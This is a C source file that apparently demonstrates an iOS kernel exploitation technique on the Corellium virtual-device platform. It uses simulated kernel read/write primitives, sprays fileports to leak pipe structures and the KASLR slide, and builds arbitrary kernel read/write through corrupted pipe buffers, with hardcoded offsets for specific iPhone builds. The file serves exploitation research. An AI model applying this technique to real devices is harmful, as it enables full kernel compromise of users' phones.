#include <stdio.h>
#include <sys/utsname.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <assert.h>
#include <sys/sysctl.h>
#include <err.h>
#include <stdbool.h>

#include "hexdump.h"
#include "corellium.h"

// Uncomment to enable logging to determine a guess for the address of a fileport object
// for a specific version/model
// #define SAMPLE_MEMORY 1

int     fileport_makeport(int, mach_port_t *);

void _check_kr(kern_return_t kr, const char *filename, int line_num, bool should_exit) {
    if (kr != KERN_SUCCESS) {
        printf("[!] Failed in %s, line %d: %s\n", filename, line_num, mach_error_string(kr));
        if (should_exit)
            exit(-1);
    }
}
#define CHECK_KR(kr) _check_kr(kr, __FILE__, __LINE__, false)

/*** Primitives to simulate a real-world vulnerability ***/

/* Simulate a 0x20 byte read from an arbitrary kernel address, representative of a primitive from a bug.
 * Caller is responsible for freeing the buffer.
 */
static char *read_kernel_data(uint64_t kaddr_to_read) {
	char *leak = calloc(1, 128);
	unicopy(UNICOPY_DST_USER|UNICOPY_SRC_KERN, (uintptr_t)leak, kaddr_to_read, 0x20);
	return leak;
}

/* Simulate a 64-bit arbitrary write */
static void kwrite64(uintptr_t kaddr, uint64_t val) {
    uint64_t value = val;
    unicopy(UNICOPY_DST_KERN|UNICOPY_SRC_USER, kaddr, (uintptr_t)&value, sizeof(value));
}

struct kpipe {
    int rfd;
    int wfd;

    uint64_t fg_ops;
    uint64_t r_fg_data;
};

#define NUM_FILEPORTS 100000
#define KERNEL_BASE 0xFFFFFFF007004000

struct kernel_params {
	off_t kobject_offset;
	uintptr_t pipe_ops_kaddr;
	uintptr_t version_string_kaddr;
	uintptr_t maxfilesperproc_kaddr;
	uintptr_t fileport_kaddr_guess;
	uintptr_t fileport_allocation_kaddr;
};

static struct kernel_params iPhone7_18F72 = {
	.kobject_offset = 0x68,
	.pipe_ops_kaddr = 0xfffffff00712d640,
	.version_string_kaddr = 0xFFFFFFF00703BB17,
	.maxfilesperproc_kaddr = 0xfffffff0077d07f0,
	.fileport_kaddr_guess = 0xffffffe19debc540,
	.fileport_allocation_kaddr = 0xFFFFFFF00756F4F8,
};

static struct kernel_params iPhoneSE_2020_18F72 = {
	.kobject_offset = 0x68,
	.pipe_ops_kaddr = 0xFFFFFFF00775D7D8,
	.version_string_kaddr = 0xFFFFFFF00703B257,
	.maxfilesperproc_kaddr = 0xFFFFFFF009998970,
	.fileport_kaddr_guess = 0xffffffe19dcc3f00,
	.fileport_allocation_kaddr = 0xFFFFFFF007EC8420,
};

static struct kernel_params iPhone7_19B74 = {
	.kobject_offset = 0x58,
	.pipe_ops_kaddr = 0xFFFFFFF007143AC8,
	.version_string_kaddr = 0xFFFFFFF00703BCBE,
	.maxfilesperproc_kaddr = 0xFFFFFFF007834AE8,
	.fileport_kaddr_guess = 0xffffffe0f7678820,
	.fileport_allocation_kaddr = 0xFFFFFFF0075A8EF4,
};

static struct kernel_params *g_kparams = NULL;


static struct kpipe *find_pipe(int rfd, int wfd) {
    struct kpipe *kp = NULL;

    char *leak = NULL;
    char *fileglob = NULL;
    char *fg_data = NULL;

	printf("[*] Spraying fileports\n");
	mach_port_t fileports[NUM_FILEPORTS] = {0};
	for (int i = 0; i < NUM_FILEPORTS; i++) {
		kern_return_t kr = fileport_makeport(rfd, &fileports[i]);
		CHECK_KR(kr);
	}
	printf("[*] Done spraying fileports\n");

#ifdef SAMPLE_MEMORY
	// No need to continue, just exit
	printf("[*] Finished creating memory sample, exiting\n");
	exit(0);
#endif

    uint64_t kaddr_to_read = g_kparams->fileport_kaddr_guess;
	leak = read_kernel_data(kaddr_to_read+g_kparams->kobject_offset);	// port->kobject, should point to a struct fileglob
	if (!leak) {
		printf("[!] Failed to read kernel data, will likely panic soon\n");
		goto out;
	}

	uint64_t pipe_fileglob_kaddr = *(uint64_t *)leak;
	if ((pipe_fileglob_kaddr & 0xff00000000000000) != 0xff00000000000000) {
		printf("[!] Failed to land the fileport spray\n");
        goto out;
	}
	pipe_fileglob_kaddr |= 0xffffff8000000000;	// Pointer might be PAC'd
	printf("[*] Found pipe structure: 0x%llx\n", pipe_fileglob_kaddr);
	
	fileglob = read_kernel_data(pipe_fileglob_kaddr+0x28);	// +0x28 points to fg_ops to leak the KASLR slide
															// +0x38 points to fg_data (struct pipe)
	if (!fileglob) {
		printf("[!] Failed to read kernel data, will likely panic soon\n");
		goto out;
	}

    kp = calloc(1, sizeof(struct kpipe));

	kp->rfd = rfd;
	kp->wfd = wfd;

	kp->fg_ops = *(uint64_t *)fileglob;
	kp->r_fg_data = *(uint64_t *)(fileglob+0x10);
	printf("[*] pipe fg_ops: 0x%llx\n", kp->fg_ops);
	printf("[*] pipe r_fg_data: 0x%llx\n", kp->r_fg_data);

out:
    for (int i = 0; i < NUM_FILEPORTS; i++) {
        kern_return_t kr = mach_port_destroy(mach_task_self(), fileports[i]);
		CHECK_KR(kr);
    }

#define FREE(m) free(m); m = NULL;
	FREE(leak);
	FREE(fileglob);
	FREE(fg_data);
#undef FREE

    return kp;
}

struct pipe_rw {
    u_int cnt;
    u_int in;
    u_int out;
    u_int size;
    uint64_t buffer;
};

struct pipe_rw_context {
	struct pipe_rw prw;
	struct kpipe *pipe1;
	struct kpipe *pipe2;
	uint64_t kslide;
};

static struct pipe_rw_context *g_pipe_rw_ctx = NULL;

struct pipe_rw_context *setup_pipe_rw() {
	// Create two pipes
	int pipe_pairs[4] = {0};
	for (int i = 0; i < 4; i += 2) {
		if (pipe(&pipe_pairs[i])) {
            errx(EXIT_FAILURE, "[!] Failed to create pipe: %s\n", strerror(errno));
        }
	}

	char pipe_buf_contents[sizeof(struct pipe_rw)];
	memset(pipe_buf_contents, 0x41, sizeof(pipe_buf_contents));
	write(pipe_pairs[1], &pipe_buf_contents, sizeof(pipe_buf_contents));
    memset(pipe_buf_contents, 0x42, sizeof(pipe_buf_contents));
    write(pipe_pairs[3], &pipe_buf_contents, sizeof(pipe_buf_contents));

	struct pipe_rw_context *ctx = calloc(1, sizeof(struct pipe_rw_context));

	ctx->pipe1 = find_pipe(pipe_pairs[0], pipe_pairs[1]);
    if (!ctx->pipe1) {
        errx(EXIT_FAILURE, "[!] Failed to leak pipe1\n");
    }

    if (ctx->pipe1->fg_ops) {
        ctx->kslide = ctx->pipe1->fg_ops - g_kparams->pipe_ops_kaddr;
    }
    printf("[*] KASLR slide: 0x%llx\n", ctx->kslide);

    ctx->pipe2 = find_pipe(pipe_pairs[2], pipe_pairs[3]);
    if (!ctx->pipe2) {
        errx(EXIT_FAILURE, "[!] Failed to leak pipe2\n");
    }

    // Set pipe1's buffer to point to pipe2's fg_data
    printf("[*] Setting pipe1->buffer (0x%llx) to pipe2's fg_data (0x%llx)...\n", (ctx->pipe1->r_fg_data+0x10), ctx->pipe2->r_fg_data);
    kwrite64(ctx->pipe1->r_fg_data+0x10, ctx->pipe2->r_fg_data);

	return ctx;
}

int pipe_kread(uint64_t kaddr, void *buf, size_t len) {
	assert(g_pipe_rw_ctx);
	struct pipe_rw_context *ctx = g_pipe_rw_ctx;

	read(ctx->pipe1->rfd, &ctx->prw, sizeof(ctx->prw));
    ctx->prw.cnt = len;
    ctx->prw.size = len;
    ctx->prw.buffer = kaddr;
	ctx->prw.in = 0;
	ctx->prw.out = 0;
    write(ctx->pipe1->wfd, &ctx->prw, sizeof(ctx->prw));

	return read(ctx->pipe2->rfd, buf, len);
}

int pipe_kwrite(uint64_t kaddr, void *buf, size_t len) {
	assert(g_pipe_rw_ctx);
	struct pipe_rw_context *ctx = g_pipe_rw_ctx;

    read(ctx->pipe1->rfd, &ctx->prw, sizeof(ctx->prw));

	if (len < 0x200) {
		ctx->prw.size = 0x200; // Original value, this works, but what if we write more than 0x200 bytes?
	} else if (len < 0x4000) {
		ctx->prw.size = 0x4000;
	} else {
		errx(EXIT_FAILURE, "[!] Writes of size >=0x4000 are not supported!\n");
	}

	ctx->prw.cnt = len;
	ctx->prw.buffer = kaddr;
	ctx->prw.in = 0;
	ctx->prw.out = 0;
    write(ctx->pipe1->wfd, &ctx->prw, sizeof(ctx->prw));

	return write(ctx->pipe2->wfd, buf, len);
}

int pipe_kwrite32(uint64_t kaddr, uint32_t val) {
	uint32_t value = val;
	return pipe_kwrite(kaddr, &value, sizeof(value));
}

int pipe_kwrite64(uint64_t kaddr, uint64_t val) {
	uint64_t value = val;
	return pipe_kwrite(kaddr, &value, sizeof(value));
}

int main(int argc, const char *argv[]) {
	struct utsname u;
    uname(&u);
	if (!strcmp(u.release, "20.5.0") && !strcmp(u.machine, "iPhone9,1")) {
		printf("[*] Detected iPhone9,1/18F72 (14.6)\n");
		g_kparams = &iPhone7_18F72;
	} else if (!strcmp(u.release, "20.5.0") && !strcmp(u.machine, "iPhone12,8")) {
		printf("[*] Detected iPhone12,8/18F72 (14.6)\n");
		g_kparams = &iPhoneSE_2020_18F72;
	} else if (!strcmp(u.release, "21.1.0") && !strcmp(u.machine, "iPhone9,1")) {
		printf("[*] Detected iPhone9,1/19B74 (15.1)\n");
		g_kparams = &iPhone7_19B74;
	} else {
		errx(EXIT_FAILURE, "[!] No offsets for %s/%s\n", u.machine, u.release);
	}

#ifdef SAMPLE_MEMORY
	uint64_t kslide = get_kernel_addr(0) - KERNEL_BASE;
	printf("Kernel slide: 0x%llx\n", kslide);
	printf("Place hypervisor hook:\n");
	uint64_t patch_address = g_kparams->fileport_allocation_kaddr+kslide;
	printf("\tprocess plugin packet monitor patch 0x%llx print_int(\"Fileport allocated\", cpu.x[0]); print(\"\\n\");\n", 
			patch_address);
	printf("Press enter to continue\n");
	getchar();
#endif

    g_pipe_rw_ctx = setup_pipe_rw();
	if (!g_pipe_rw_ctx) {
		errx(EXIT_FAILURE, "Failed to set up pipe read/write primitives\n");
	}

	// Example of arbitrary read
	printf("[*] Beginning arbitrary read of kernel version string...\n");
	char version[128] = {0};
	pipe_kread(g_kparams->version_string_kaddr+g_pipe_rw_ctx->kslide, &version, sizeof(version));
	hexdump(version, sizeof(version));

	// Example of arbitrary write
	printf("[*] Beginning arbitrary write of kern.maxfilesperproc...\n");
	pipe_kwrite32(g_kparams->maxfilesperproc_kaddr+g_pipe_rw_ctx->kslide, 0x41414141);
	int maxfilesperproc = 0;
	size_t sysctl_size = sizeof(int);
	if (sysctlbyname("kern.maxfilesperproc", &maxfilesperproc, &sysctl_size, NULL, 0)) {
        errx(EXIT_FAILURE, "sysctlbyname: %s\n", strerror(errno));
    }
	printf("[*] kern.maxfilesperproc: %d (0x%x)\n", maxfilesperproc, maxfilesperproc);

    printf("Done, entering infinite loop, will panic on termination\n");
    for (;;) {}

    return 0;
}